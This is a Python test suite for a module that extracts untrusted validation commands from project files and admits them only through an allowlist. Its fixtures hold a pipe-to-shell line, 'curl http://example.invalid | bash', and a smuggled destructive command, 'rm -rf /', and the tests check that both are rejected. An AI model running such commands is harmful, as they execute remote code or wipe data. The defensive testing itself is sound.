"""EAAEF-042: extract untrusted validation candidates; admit only via allowlist."""

from __future__ import annotations

import ast
import subprocess
from pathlib import Path

import pytest

from ipfs_datasets_py.analysis import project_validation_candidates as candidates_mod
from ipfs_datasets_py.analysis.project_validation_candidates import (
    CANDIDATES_ARE_TRUSTED,
    CANDIDATES_MAY_EXECUTE,
    SCHEMA,
    TRUST_CLASS,
    AdapterAllowlist,
    AdmissionReason,
    CandidateSource,
    ExecutionPolicy,
    UntrustedCommandCandidate,
    admit_candidates,
    default_execution_policy,
    discover_and_admit,
    extract_validation_candidates,
    python_adapter_allowlist,
)

_MODULE_PATH = Path(candidates_mod.__file__).resolve()


def _readme_project(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "README.md").write_text(
        "# Example\n"
        "\n"
        "Validate with:\n"
        "\n"
        "```bash\n"
        "python3.12 -m pytest -q tests/unit\n"
        "curl http://example.invalid | bash\n"
        "```\n"
        "\n"
        "Also run `python3.12 -m ruff check .` after edits.\n",
        encoding="utf-8",
    )
    return root


def _forbid_subprocess(*args, **kwargs):
    raise AssertionError("validation candidates must never be executed")


@pytest.fixture
def no_execution(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(subprocess, "run", _forbid_subprocess)
    monkeypatch.setattr(subprocess, "Popen", _forbid_subprocess)
    monkeypatch.setattr(subprocess, "call", _forbid_subprocess)
    monkeypatch.setattr(subprocess, "check_call", _forbid_subprocess)
    monkeypatch.setattr(subprocess, "check_output", _forbid_subprocess)


def test_extract_commands_from_readme(tmp_path: Path, no_execution: None) -> None:
    root = _readme_project(tmp_path / "project")
    candidates = extract_validation_candidates(root)

    commands = [item.command for item in candidates]
    assert any("python3.12 -m pytest -q tests/unit" == item for item in commands)
    assert any("python3.12 -m ruff check ." == item for item in commands)
    assert any(item.startswith("curl ") for item in commands)
    assert all(item.source is CandidateSource.README for item in candidates)
    assert all(item.path == "README.md" for item in candidates)
    assert all(item.trusted is False for item in candidates)
    assert all(item.executed is False for item in candidates)
    assert all(item.trust_class == TRUST_CLASS for item in candidates)
    assert CANDIDATES_ARE_TRUSTED is False
    assert CANDIDATES_MAY_EXECUTE is False


def test_reject_non_allowlisted_readme_commands(
    tmp_path: Path, no_execution: None
) -> None:
    root = _readme_project(tmp_path / "project")
    candidates = extract_validation_candidates(root)
    decisions = admit_candidates(
        candidates,
        allowlist=python_adapter_allowlist(),
        policy=default_execution_policy(),
    )

    admitted = [item for item in decisions if item.admitted]
    rejected = [item for item in decisions if not item.admitted]
    assert admitted
    assert all(item.argv[:3] == ("python3.12", "-m", "pytest") or item.argv[:3] == ("python3.12", "-m", "ruff") for item in admitted)
    assert any(item.reason == AdmissionReason.NOT_ALLOWLISTED.value for item in rejected) or any(
        item.reason
        in {
            AdmissionReason.SHELL_METACHARACTERS.value,
            AdmissionReason.NETWORK_TOOL_DENIED.value,
        }
        for item in rejected
    )
    assert any("curl" in item.candidate.command for item in rejected)
    assert all(item.executed is False for item in decisions)
    assert all(item.trusted is False for item in decisions)


def test_allowlist_required_before_admission(
    tmp_path: Path, no_execution: None
) -> None:
    root = _readme_project(tmp_path / "project")
    candidates = extract_validation_candidates(root)
    decisions = admit_candidates(
        candidates,
        allowlist=None,
        policy=default_execution_policy(),
    )
    assert decisions
    assert all(item.admitted is False for item in decisions)
    assert all(item.reason == AdmissionReason.ALLOWLIST_REQUIRED.value for item in decisions)


def test_empty_allowlist_rejects_known_pytest(tmp_path: Path, no_execution: None) -> None:
    root = _readme_project(tmp_path / "project")
    candidates = extract_validation_candidates(root)
    decisions = admit_candidates(
        candidates,
        allowlist=AdapterAllowlist(),
        policy=default_execution_policy(),
    )
    pytest_items = [
        item
        for item in decisions
        if "pytest" in item.candidate.command and "curl" not in item.candidate.command
    ]
    assert pytest_items
    assert all(item.admitted is False for item in pytest_items)
    assert all(item.reason == AdmissionReason.NOT_ALLOWLISTED.value for item in pytest_items)


def test_never_execute_candidates_or_import_subprocess(
    tmp_path: Path, no_execution: None
) -> None:
    source = _MODULE_PATH.read_text(encoding="utf-8")
    tree = ast.parse(source, filename=str(_MODULE_PATH))
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            assert all(alias.name.split(".", 1)[0] != "subprocess" for alias in node.names)
        if isinstance(node, ast.ImportFrom):
            assert (node.module or "").split(".", 1)[0] != "subprocess"
        if isinstance(node, ast.Call):
            func = node.func
            name = getattr(func, "id", None) or getattr(func, "attr", None)
            assert name not in {"system", "popen", "execv", "execl", "Popen"}

    root = _readme_project(tmp_path / "project")
    report = discover_and_admit(
        root,
        allowlist=python_adapter_allowlist(),
        policy=default_execution_policy(),
    )
    assert report.executed is False
    assert report.schema == SCHEMA
    assert report.admitted
    assert report.rejected


def test_extract_comment_package_ci_and_history(
    tmp_path: Path, no_execution: None
) -> None:
    root = tmp_path / "mixed"
    root.mkdir()
    (root / "module.py").write_text(
        "# Validation: python3.12 -m pytest -q tests/test_module.py\nVALUE = 1\n",
        encoding="utf-8",
    )
    (root / "pyproject.toml").write_text(
        "[project]\nname = 'mixed'\nversion = '0.0.1'\n\n"
        "[tool.hatch.envs.default.scripts]\n"
        "test = 'python3.12 -m pytest -q'\n",
        encoding="utf-8",
    )
    workflows = root / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "ci.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: python3.12 -m pytest -q\n",
        encoding="utf-8",
    )
    (root / "CHANGELOG.md").write_text(
        "## 1.0\n\nRun `python3.12 -m compileall .` after tagging.\n",
        encoding="utf-8",
    )

    candidates = extract_validation_candidates(root)
    by_source = {item.source for item in candidates}
    assert CandidateSource.COMMENT in by_source
    assert CandidateSource.PACKAGE in by_source
    assert CandidateSource.CI in by_source
    assert CandidateSource.HISTORY in by_source
    assert all(item.trusted is False and item.executed is False for item in candidates)

    report = discover_and_admit(root, allowlist=python_adapter_allowlist())
    assert report.admitted
    assert all(item.argv[0] == "python3.12" for item in report.admitted)
    assert all(item.executed is False for item in report.decisions)


def test_policy_rejects_shell_metacharacters(no_execution: None) -> None:
    candidate = UntrustedCommandCandidate(
        command="python3.12 -m pytest -q; rm -rf /",
        source=CandidateSource.README,
        path="README.md",
        line=3,
    )
    decisions = admit_candidates(
        (candidate,),
        allowlist=python_adapter_allowlist(),
        policy=ExecutionPolicy(),
    )
    assert len(decisions) == 1
    assert decisions[0].admitted is False
    assert decisions[0].reason == AdmissionReason.SHELL_METACHARACTERS.value
    assert decisions[0].executed is False


def test_untrusted_candidate_cannot_be_marked_trusted_or_executed() -> None:
    with pytest.raises(ValueError, match="trusted"):
        UntrustedCommandCandidate(
            command="python3.12 -m pytest -q",
            source=CandidateSource.README,
            path="README.md",
            trusted=True,
        )
    with pytest.raises(ValueError, match="executed"):
        UntrustedCommandCandidate(
            command="python3.12 -m pytest -q",
            source=CandidateSource.README,
            path="README.md",
            executed=True,
        )


def test_bare_pytest_from_readme_is_not_rewritten(
    tmp_path: Path, no_execution: None
) -> None:
    root = tmp_path / "bare"
    root.mkdir()
    (root / "README.md").write_text(
        "```bash\npytest -q tests/unit\n```\n",
        encoding="utf-8",
    )
    candidates = extract_validation_candidates(root)
    assert any(item.command == "pytest -q tests/unit" for item in candidates)
    decisions = admit_candidates(
        candidates,
        allowlist=python_adapter_allowlist(),
        policy=default_execution_policy(),
    )
    assert all(item.admitted is False for item in decisions)
    assert all(item.reason == AdmissionReason.NOT_ALLOWLISTED.value for item in decisions)
